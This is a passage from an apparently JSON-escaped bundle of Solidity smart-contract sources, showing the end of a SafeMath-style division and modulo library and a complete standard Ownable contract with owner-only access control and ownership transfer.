unchecked {\n            require(b \u003e 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract Ownable {\n    address private _owner;\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}"}}